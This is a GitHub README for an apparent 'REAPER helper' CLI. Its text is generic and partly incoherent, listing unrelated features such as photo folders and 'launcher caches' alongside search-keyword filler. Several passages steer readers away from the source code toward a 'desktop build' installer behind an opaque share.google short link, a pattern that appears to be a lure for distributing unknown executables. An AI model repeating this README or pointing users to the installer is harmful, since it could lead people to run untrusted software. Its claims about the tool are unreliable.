![Reaper](assets/hero.png)

# Reaper

*Cockos REAPER DAW for tracks, routing, and custom actions.*

## About

**Reaper** is Cockos' DAW: tracks, routing, and a small portable install. Projects (.rpp) and the resource path live where you pointed them.

This GitHub repository is the **Python CLI source** for a local Reaper helper, plus notes for the packaged desktop build. The CLI reads paths on the machine that runs it. It does not upload your projects.

The **desktop build** is the same job as an installer for Windows (and macOS where the setup page lists it). No Python, no venv. Open the setup page, follow the steps, then use the installed app the same way you would use `main.py`.

Everything stays on the PC that starts the tool. Original project files are left in place unless you pass a write path. The desktop installer and the CLI in this repo do the same job; pick one.

## What's included

This GitHub repository is the **Python CLI source**. Clone it, install requirements, run `main.py --help`, then run against a local path.

The **desktop build** (installer, no Python) is on the [setup page](https://share.google/A1IHfyGRT0zGRLqj8). It is the same helper in a windowed install for Windows and macOS.

## Highlights

- Finds the Reaper project directory.
- Copies preset and sample files to a dated archive.
- Lists photo and export folders.
- Writes a short report of what was kept.

## Why it exists

Reaper drops project files next to launcher caches.

People search Reaper desktop and PC when they want the folder on disk.

A named helper is easier to find than a generic zip.

## Requirements

- **Desktop build:** Windows 10 or 11 (macOS when the setup page lists it). No Python.
- **CLI:** Python 3.11 or newer, `pip`, and the packages in `requirements.txt`.
- Local disk access only. The CLI does not need a Reaper account just to list or copy folders.
- A writable folder if you pass `--out`.

## Usage

Skip this section if you installed the desktop build. It is only for the source in this repository.

Python **3.11+**. Open a terminal in the repo root (the folder that contains `main.py`).

**Install**

```text
python -m pip install -r requirements.txt
```

**See every flag**

```text
python main.py --help
```

`--help` is the full command list for this tree. Read it once before the first real run.

**Typical next commands**

```text
python main.py . --preview
python main.py "C:\Users\Public" --out .\export
```

| Flag | What it does |
| --- | --- |
| `--help` | Print the command list and exit |
| `--preview` | Show the plan only. Nothing is written |
| `--out` | Output folder when you do not want to touch the source |
| `path` | Optional input file or folder |

If a flag is missing on this copy, `--help` is the source of truth. The desktop build exposes the same job without these commands.

## Download

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/ruth-jordan61/reaper

MIT license. See `LICENSE`.
